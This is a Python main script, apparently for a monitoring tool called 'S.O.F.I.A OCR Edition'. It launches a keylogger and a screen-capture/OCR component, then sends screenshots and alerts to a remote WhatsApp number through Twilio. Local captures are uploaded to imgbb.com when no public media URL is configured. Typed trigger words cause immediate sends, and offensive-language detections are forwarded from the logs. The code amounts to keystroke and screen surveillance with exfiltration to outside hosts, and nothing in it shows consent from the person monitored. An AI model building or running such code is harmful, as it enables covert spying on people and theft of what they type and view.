import threading
import os
import time
import logging
import getpass
import sys
import json
from pathlib import Path
import requests
import base64
from config import settings
from core.whatsapp_client import WhatsAppClient
from core.ocr_analyzer import OCRAnalyzer
from core.screen_capture import ScreenCapture
from core.keylogger import KeyLogger
from ui.gui import pedir_chat_id, pedir_numero_whatsapp_popup
from utils.file_manager import create_capture_directory
from utils.logger import logger
from prometheus_client import start_http_server, Gauge
import psutil

try:
    from twilio.rest import Client as TwilioRestClient
except Exception:
    TwilioRestClient = None

from dotenv import load_dotenv
load_dotenv()

TWILIO_ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID")
TWILIO_AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN")
TWILIO_WHATSAPP_FROM = os.getenv("TWILIO_WHATSAPP_FROM")
IMGBB_API_KEY = os.getenv("IMGBB_API_KEY")

def main():
    # Intentar cargar credenciales desde archivo local (twilio_secrets.json) para no pedirlas manualmente
    def load_twilio_secrets_file():
        try:
            p = Path(__file__).parent / "twilio_secrets.json"
            if not p.exists():
                return
            data = json.loads(p.read_text(encoding="utf-8"))
            for k in ("TWILIO_ACCOUNT_SID", "TWILIO_AUTH_TOKEN", "TWILIO_WHATSAPP_FROM"):
                v = data.get(k) or data.get(k.lower())
                if v:
                    os.environ.setdefault(k, v)
            logger.info(f"[TWILIO] Credenciales cargadas desde {p}")
        except Exception as e:
            logger.warning(f"[TWILIO] Error leyendo twilio_secrets.json: {e}")
    load_twilio_secrets_file()

    # Solicitar número de WhatsApp destino (E.164) mediante popup
    chat_id = pedir_numero_whatsapp_popup()
    if not chat_id:
        print("No se configuró un número de WhatsApp válido. Cerrando programa.")
        exit()
    
    def prompt_twilio_credentials(missing):
        # Solicitar al usuario las credenciales que faltan (no imprimir el token)
        print("Se detectó que faltan variables de Twilio:", ", ".join(missing))
        print("Puedes pegarlas ahora. (El Auth Token se ocultará al teclear)")
        if 'TWILIO_ACCOUNT_SID' in missing:
            sid = input("TWILIO_ACCOUNT_SID: ").strip()
            if sid:
                os.environ['TWILIO_ACCOUNT_SID'] = sid
        if 'TWILIO_AUTH_TOKEN' in missing:
            token = getpass.getpass("TWILIO_AUTH_TOKEN (oculto): ").strip()
            if token:
                os.environ['TWILIO_AUTH_TOKEN'] = token
        if 'TWILIO_WHATSAPP_FROM' in missing:
            from_num = input("TWILIO_WHATSAPP_FROM (ej. whatsapp:+1415...): ").strip()
            if from_num:
                os.environ['TWILIO_WHATSAPP_FROM'] = from_num

    def verify_twilio_config():
        required = ['TWILIO_ACCOUNT_SID', 'TWILIO_AUTH_TOKEN', 'TWILIO_WHATSAPP_FROM']
        missing = []
        for k in required:
            env_val = os.environ.get(k)
            cfg_val = getattr(settings, k.lower(), None)  # si en settings están en minúscula
            if not (env_val or cfg_val):
                missing.append(k)
        if missing:
            logger.error(f"[TWILIO] Falta configuración: {', '.join(missing)}. Defínelas en settings o variables de entorno.")
            # Si estamos en una terminal interactiva, ofrecer pedirlas ahora (no persistente)
            if sys.stdin.isatty():
                prompt_twilio_credentials(missing)
                # recomponer la lista de faltantes tras el prompt
                still_missing = [k for k in required if not (os.environ.get(k) or getattr(settings, k.lower(), None))]
                if still_missing:
                    logger.error(f"[TWILIO] Siguen faltando: {', '.join(still_missing)}. Abortando.")
                    raise SystemExit(1)
                return
            raise SystemExit(1)
    try:
        verify_twilio_config()
    except SystemExit:
        print("Faltan credenciales de Twilio. Revisa variables de entorno o config.settings. Abortando.")
        raise
    # Crear directorio de capturas
    create_capture_directory()

    # Inicializar componentes (WhatsApp con manejo de reauth)
    try:
        whatsapp_client = WhatsAppClient()
    except Exception as e:
        # Fallo al iniciar cliente WhatsApp — loguear y reintentar una vez con pequeña espera
        logger.error(f"[WHATSAPP] Error iniciando cliente WhatsApp: {e}")
        time.sleep(1)
        whatsapp_client = WhatsAppClient()

    # Comprobación mínima: existencia de método send_message en el cliente
    send_fn = getattr(whatsapp_client, "send_message", None)
    if not callable(send_fn):
        # Si no existe send_message, crear un wrapper Twilio simple y usarlo
        if TwilioRestClient is None:
            logger.error("[TWILIO] paquete 'twilio' no disponible. Instala con: pip install twilio")
            raise SystemExit(1)

        class TwilioWhatsAppClient:
            def __init__(self):
                self.account_sid = os.environ.get('TWILIO_ACCOUNT_SID') or getattr(settings, 'twilio_account_sid', None)
                self.auth_token = os.environ.get('TWILIO_AUTH_TOKEN') or getattr(settings, 'twilio_auth_token', None)
                self.from_number = os.environ.get('TWILIO_WHATSAPP_FROM') or getattr(settings, 'twilio_whatsapp_from', None)
                if not (self.account_sid and self.auth_token and self.from_number):
                    raise RuntimeError("Faltan TWILIO_ACCOUNT_SID / TWILIO_AUTH_TOKEN / TWILIO_WHATSAPP_FROM")
                self._client = TwilioRestClient(self.account_sid, self.auth_token)

            def send_message(self, body, to, media_url=None):
                # to debe venir en formato 'whatsapp:+<número>'
                params = {
                    'from_': self.from_number,
                    'body': body,
                    'to': to
                }
                if media_url:
                    params['media_url'] = [media_url]
                try:
                    msg = self._client.messages.create(**params)
                    logger.info(f"[TWILIO] Mensaje enviado SID={getattr(msg, 'sid', None)}")
                    return msg
                except Exception as e:
                    logger.error(f"[TWILIO] Error enviando mensaje: {e}")
                    raise

            def send_image(self, image_path_or_url, to=None, caption=None):
                """
                Envía una imagen a 'to' (formato 'whatsapp:+<número>').
                - Si image_path_or_url comienza con http/https se usa como media_url.
                - Si es ruta local, primero intenta usar TWILIO_MEDIA_BASE_URL/settings.twilio_media_base_url.
                - Si no existe, intenta subir el archivo a imgbb y usar la URL resultante.
                Nota: Twilio necesita una URL pública accesible por Internet.
                """
                s = str(image_path_or_url) if image_path_or_url is not None else ""
                # detectar si se llamo con parámetros intercambiados: send_image(to, image) o send_image("whatsapp:+...", "<ruta>")
                if s.lower().startswith("whatsapp:") or s.startswith("+"):
                    # primer argumento parece un número -> asumir swap si 'to' parece ruta/url o None
                    if to:
                        logger.warning(f"[TWILIO] send_image recibió parámetros posiblemente invertidos; intercambiando. recibidos: ({image_path_or_url}, {to})")
                        # swap
                        s, to = to, s
                    else:
                        # solo se pasó el teléfono en el primer parámetro y no hay segundo arg: error
                        raise RuntimeError("send_image: argumento 'to' no proporcionado. Uso correcto: send_image(image_path_or_url, to)")
                # ahora 's' es la ruta/URL de la imagen y 'to' es el destinatario
                if not to:
                    raise RuntimeError("send_image: faltó destinatario 'to' (p. ej. 'whatsapp:+34123456789')")

                # procesamiento normal
                if s.lower().startswith("http://") or s.lower().startswith("https://"):
                    media_url = s
                else:
                    img_path = Path(s)
                    if not img_path.exists():
                        logger.error(f"[TWILIO] Ruta de imagen local no encontrada: {s}")
                        raise RuntimeError(f"Archivo local no existe: {s}")
                    media_base = os.environ.get('TWILIO_MEDIA_BASE_URL') or getattr(settings, 'twilio_media_base_url', None)
                    if media_base:
                        # componer URL pública desde base configurada
                        try:
                            rel = img_path.relative_to(Path(__file__).parent)
                        except Exception:
                            try:
                                rel = img_path.relative_to(Path.cwd())
                            except Exception:
                                rel = Path(img_path.name)
                        rel_url = "/".join(rel.parts)
                        media_url = media_base.rstrip("/") + "/" + rel_url
                    else:
                        # Intentar subir a imgbb como fallback automático
                        imgbb_key = os.environ.get('IMGBB_API_KEY') or getattr(settings, 'imgbb_api_key', None)
                        if not imgbb_key:
                            logger.error("IMGBB_API_KEY no configurada y TWILIO_MEDIA_BASE_URL no definida")
                            raise RuntimeError("Falta IMGBB_API_KEY; define TWILIO_MEDIA_BASE_URL o IMGBB_API_KEY.")
                        try:
                            logger.info(f"[TWILIO] Subiendo {s} a imgbb.com como fallback para Twilio media_url")
                            with open(s, "rb") as fh:
                                b64 = base64.b64encode(fh.read()).decode('ascii')
                            resp = requests.post(
                                "https://api.imgbb.com/1/upload",
                                data={'key': imgbb_key, 'image': b64},
                                timeout=60
                            )
                            if resp.status_code != 200:
                                logger.error(f"[TWILIO] Falló subida a imgbb ({resp.status_code}): {resp.text}")
                                raise RuntimeError("Falló subida a imgbb; configura TWILIO_MEDIA_BASE_URL o usa una URL pública.")
                            j = resp.json()
                            media_url = j.get('data', {}).get('url') or j.get('data', {}).get('display_url')
                            if not media_url:
                                logger.error(f"[TWILIO] Respuesta imgbb sin URL: {j}")
                                raise RuntimeError("Respuesta imgbb no contiene URL válida.")
                            logger.info(f"[TWILIO] Subida a imgbb completa, media_url={media_url}")
                        except Exception as ex:
                            logger.error(f"[TWILIO] Error subiendo archivo local a imgbb: {ex}")
                            raise RuntimeError(
                                "No se puede enviar un archivo local directamente y la subida automática a imgbb falló. "
                                "Configura TWILIO_MEDIA_BASE_URL/settings.twilio_media_base_url o sube la imagen a una URL pública."
                            ) from ex

                params = {'from_': self.from_number, 'to': to, 'media_url': [media_url]}
                if caption:
                    params['body'] = caption
                try:
                    msg = self._client.messages.create(**params)
                    logger.info(f"[TWILIO] Imagen enviada SID={getattr(msg, 'sid', None)} media_url={media_url}")
                    return msg
                except Exception as e:
                    logger.error(f"[TWILIO] Error enviando imagen: {e}")
                    raise

            # alias por compatibilidad
            send_media = send_image
            send_image_file = send_image

        logger.info("[MAIN] Reemplazando WhatsAppClient por TwilioWhatsAppClient")
        whatsapp_client = TwilioWhatsAppClient()
    
    ocr_analyzer = OCRAnalyzer()
    screen_capture = ScreenCapture(whatsapp_client, ocr_analyzer)
    # Normalizar chat_id: asegurar prefijo 'whatsapp:'
    if not chat_id.startswith("whatsapp:"):
        if chat_id.startswith("+"):
            chat_id = "whatsapp:" + chat_id
        else:
            chat_id = "whatsapp:+" + chat_id.lstrip("+")
    screen_capture.set_chat_id(chat_id)

    # --- NEW: handler que detecta errores de autenticación y re-crea el cliente ---
    class AuthErrorHandler(logging.Handler):
        def __init__(self, screen_capture, whatsapp_client_cls, min_interval=30):
            super().__init__()
            self.screen_capture = screen_capture
            self.whatsapp_client_cls = whatsapp_client_cls
            self.min_interval = min_interval
            self._lock = threading.Lock()
            self._last = 0

        def emit(self, record):
            try:
                msg = self.format(record)
                # detectar mensajes típicos de token expirado / 401 desde los logs
                if ('Error subiendo media (401)' in msg) or ('Error validating access token' in msg) or ('"code":190' in msg):
                    now = time.time()
                    with self._lock:
                        if now - self._last < self.min_interval:
                            return
                        self._last = now
                    try:
                        # re-instanciar cliente y asignarlo al screen_capture en ejecución
                        new_client = self.whatsapp_client_cls()
                        self.screen_capture.whatsapp_client = new_client
                        logger.info("[WHATSAPP] Reautenticación automática: nuevo cliente asignado")
                    except Exception as ex:
                        logger.error(f"[WHATSAPP] Reautenticación fallida: {ex}")
            except Exception:
                # nunca dejar que el handler eleve excepción
                pass

    # Adjuntar handler al logger para detectar y reaccionar a errores 401
    auth_handler = AuthErrorHandler(screen_capture, WhatsAppClient, min_interval=30)
    auth_handler.setLevel(logging.ERROR)
    logger.addHandler(auth_handler)
    # --- END NEW ---

    # --- NEW: handler que detecta lenguaje ofensivo en los logs y envía una alerta por WhatsApp ---
    class ProfanityAlertHandler(logging.Handler):
        def __init__(self, whatsapp_client, chat_id, min_interval=300):
            super().__init__()
            self.whatsapp_client = whatsapp_client
            self.chat_id = chat_id
            self.min_interval = min_interval
            self._lock = threading.Lock()
            self._last = 0

        def emit(self, record):
            try:
                msg = self.format(record)
                # detectar cadenas típicas de log de detección de lenguaje ofensivo
                if ('Lenguaje ofensivo detectado' in msg) or ('lenguaje ofensivo' in msg) or ('detected NSFW' in msg):
                    now = time.time()
                    with self._lock:
                        if now - self._last < self.min_interval:
                            return
                        self._last = now
                    try:
                        body = f"ALERTA SOFIA: Lenguaje ofensivo detectado.\nDetalle: {msg}"
                        # intentar enviar mensaje sencillo; swallow exceptions para no bloquear logging
                        try:
                            self.whatsapp_client.send_message(body, self.chat_id)
                            logger.info("[TWILIO] Alerta de lenguaje ofensivo enviada por WhatsApp")
                        except Exception as ex:
                            logger.error(f"[TWILIO] Falló enviar alerta de lenguaje ofensivo: {ex}")
                    except Exception:
                        # nunca elevar excepción desde handler
                        pass
            except Exception:
                pass

    # Adjuntar handler al logger para detectar lenguaje ofensivo (INFO/WARNING)
    try:
        profanity_handler = ProfanityAlertHandler(whatsapp_client, chat_id, min_interval=300)
        profanity_handler.setLevel(logging.INFO)
        logger.addHandler(profanity_handler)
    except Exception as e:
        logger.warning(f"[MAIN] No se pudo registrar ProfanityAlertHandler: {e}")
    # --- END NEW ---

    keylogger = KeyLogger(screen_capture)
    
    print(f"S.O.F.I.A OCR Edition iniciando...")
    print(f"Enviando alertas a WhatsApp número: {chat_id}")
    print("CARACTERÍSTICAS MEJORADAS:")
    print("- ⚡ Detección por teclado: ENVÍO INMEDIATO (foto, salir, video, vermela)")
    print("- 🖼️ Envío de capturas OCR automáticas")
    print("- 🔒 Reautenticación automática ante errores 401")
    
    # Inicia el servidor Prometheus en el puerto 8000
    start_http_server(8000)

    # Define métricas
    cpu_gauge = Gauge('sof_cpu_percent', 'Uso de CPU (%)')
    mem_gauge = Gauge('sof_mem_percent', 'Uso de memoria (%)')

    def update_metrics():
        while not stop_event.is_set():
            cpu_gauge.set(psutil.cpu_percent())
            mem_gauge.set(psutil.virtual_memory().percent)
            time.sleep(5)

    t_metrics = threading.Thread(target=update_metrics, daemon=True)
    t_metrics.start()

    # Intentar iniciar los componentes: preferir start(), si no existe usar run() u otros fallbacks
    stop_event = threading.Event()
    threads = []

    def start_component(obj, name):
        # 1) intentar start() directo (no bloqueante)
        try:
            start_fn = getattr(obj, "start", None)
            if callable(start_fn):
                start_fn()
                logger.info(f"[MAIN] {name} iniciado mediante start()")
                return
        except Exception as e:
            logger.warning(f"[MAIN] start() falló en {name}: {e}")

        # 2) intentar run() ejecutado en hilo (bloqueante)
        run_fn = getattr(obj, "run", None)
        if callable(run_fn):
            t = threading.Thread(target=run_fn, name=name, daemon=True)
            t.start()
            threads.append(t)
            logger.info(f"[MAIN] {name} iniciado en thread con run()")
            return

        # 3) detectar métodos útiles por nombre y lanzarlos en hilo
        patterns = ("start", "run", "listen", "capture", "loop", "watch", "monitor", "begin", "activate", "launch", "worker", "process", "handle")
        # recolectar callables públicos
        callables = [m for m in dir(obj) if not m.startswith("_") and callable(getattr(obj, m))]
        # priorizar por patrón
        candidates = [m for m in callables if any(p in m.lower() for p in patterns)]
        if not candidates and callables:
            # intentar cualquiera si no hay coincidencias obvias
            logger.debug(f"[MAIN] {name} métodos públicos detectados: {callables}")
            candidates = [callables[0]]

        for m in candidates:
            fn = getattr(obj, m, None)
            if not callable(fn):
                continue
            try:
                # lanzar en hilo y dejar que el método gestione su propio bucle si es necesario
                t = threading.Thread(target=lambda f=fn: f(), name=f"{name}.{m}", daemon=True)
                t.start()
                threads.append(t)
                logger.info(f"[MAIN] {name} iniciado en hilo llamando a {m}()")
                return
            except Exception as e:
                logger.warning(f"[MAIN] Llamada a {name}.{m}() falló: {e}")

        # 4) si el objeto es callable, lanzarlo
        if callable(obj):
            try:
                t = threading.Thread(target=obj, name=name, daemon=True)
                t.start()
                threads.append(t)
                logger.info(f"[MAIN] {name} iniciado en hilo llamando al objeto callable")
                return
            except Exception as e:
                logger.warning(f"[MAIN] Inicio llamando al objeto callable {name} falló: {e}")

        # 5) no se pudo iniciar; listar métodos para diagnóstico
        logger.warning(f"[MAIN] {name} no se pudo iniciar. Métodos disponibles: {callables if 'callables' in locals() else []}")

    # Iniciar componentes con la función robusta
    start_component(screen_capture, "screen_capture")
    start_component(keylogger, "keylogger")

    # === NUEVO: archivado mensual automático (cada día 24) ===
    import zipfile
    from datetime import datetime, date, timedelta

    def archive_capturas_if_due():
        base = Path(__file__).parent
        capturas_dir = base / "capturas"
        archives_dir = base / "capturas_archives"
        archives_dir.mkdir(exist_ok=True)

        last_run_file = archives_dir / ".last_archive_run"
        today = date.today()
        today_str = today.isoformat()

        # si no es día 24 no hacer nada
        if today.day != 24:
            return

        # evitar ejecutar más de una vez por día (persistente)
        if last_run_file.exists():
            try:
                if last_run_file.read_text(encoding="utf-8").strip() == today_str:
                    logger.info("[ARCHIVE] Ya se ejecutó archivado hoy, omitiendo.")
                    return
            except Exception:
                pass

        if not capturas_dir.exists():
            logger.info("[ARCHIVE] No existe carpeta 'capturas', nada que archivar.")
            last_run_file.write_text(today_str, encoding="utf-8")
            return

        # agrupar ficheros por mes-año según su mtime (YYYY-MM)
        files_by_month = {}
        for p in capturas_dir.iterdir():
            if not p.is_file():
                continue
            if p.suffix.lower() == ".zip":
                continue
            mtime = datetime.fromtimestamp(p.stat().st_mtime)
            key = f"{mtime.year}-{mtime.month:02d}"
            # mantener sólo meses distintos al mes actual (conservar imágenes del mes corriente sin archivar)
            if mtime.year == today.year and mtime.month == today.month:
                continue
            files_by_month.setdefault(key, []).append(p)

        if not files_by_month:
            logger.info("[ARCHIVE] No hay ficheros antiguos para archivar.")
            last_run_file.write_text(today_str, encoding="utf-8")
            return

        # crear zips por mes y eliminar ficheros archivados
        for month_key, paths in files_by_month.items():
            zip_name = archives_dir / f"capturas_{month_key}.zip"
            try:
                mode = "a" if zip_name.exists() else "w"
                with zipfile.ZipFile(zip_name, mode, compression=zipfile.ZIP_DEFLATED) as zf:
                    for p in paths:
                        try:
                            # guardar con nombre relativo dentro del zip (solo filename)
                            zf.write(p, arcname=p.name)
                            logger.info(f"[ARCHIVE] Añadido a {zip_name.name}: {p.name}")
                        except Exception as e:
                            logger.warning(f"[ARCHIVE] Falló añadir {p} a zip: {e}")
                # si zip creado/actualizado, borrar archivos originales
                for p in paths:
                    try:
                        p.unlink()
                        logger.info(f"[ARCHIVE] Archivo eliminado tras zip: {p}")
                    except Exception as e:
                        logger.warning(f"[ARCHIVE] No se pudo borrar {p}: {e}")
            except Exception as e:
                logger.error(f"[ARCHIVE] Error creando zip {zip_name}: {e}")

        # marcar ejecución completada hoy
        try:
            last_run_file.write_text(today_str, encoding="utf-8")
        except Exception:
            logger.warning("[ARCHIVE] No se pudo escribir archivo de control .last_archive_run")

    def archive_loop(stop_event):
        # comprobación inicial inmediata (por si el programa arranca el día 24)
        try:
            archive_capturas_if_due()
        except Exception as e:
            logger.exception(f"[ARCHIVE] Error en archivado inicial: {e}")
        # bucle: cada 24 horas comprobar la fecha (optimización: menos frecuencia)
        while not stop_event.wait(timeout=86400):  # 86400 segundos = 24 horas
            try:
                archive_capturas_if_due()
            except Exception as e:
                logger.exception(f"[ARCHIVE] Error en archivado programado: {e}")

    # iniciar hilo de archivado (se ejecutará en background)
    stop_event_for_archiver = threading.Event()
    t_arch = threading.Thread(target=lambda: archive_loop(stop_event_for_archiver), name="archiver", daemon=True)
    t_arch.start()
    # === END NUEVO ===

    # === OPTIMIZACIÓN: Monitoreo de CPU ===
    try:
        import psutil  # Instala con: pip install psutil
        def monitor_cpu():
            while not stop_event.is_set():
                cpu = psutil.cpu_percent(interval=1)
                if cpu > 80:
                    logger.warning(f"[PERFORMANCE] Uso alto de CPU: {cpu}%")
                time.sleep(10)
        t_monitor = threading.Thread(target=monitor_cpu, daemon=True)
        t_monitor.start()
    except ImportError:
        logger.warning("[PERFORMANCE] psutil no disponible, monitoreo de CPU deshabilitado.")

    # Mantener el programa vivo hasta Ctrl+C y luego intentar limpieza
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("[MAIN] Interrupción por usuario, intentando detener componentes...")
        # señalizar a los bucles que deben parar
        stop_event.set()
        # intentar stop() en cada componente si existe
        for obj, name in ((screen_capture, "screen_capture"), (keylogger, "keylogger"), (whatsapp_client, "whatsapp_client")):
            stop_fn = getattr(obj, "stop", None)
            if callable(stop_fn):
                try:
                    stop_fn()
                    logger.info(f"[MAIN] {name} detenido mediante stop()")
                except Exception as e:
                    logger.warning(f"[MAIN] stop() falló en {name}: {e}")
        # esperar a que hilos terminen (join con timeout corto)
        for t in threads:
            try:
                t.join(timeout=1.0)
            except Exception:
                pass
        # dar pequeño margen extra
        time.sleep(0.2)

if __name__ == "__main__":
    main()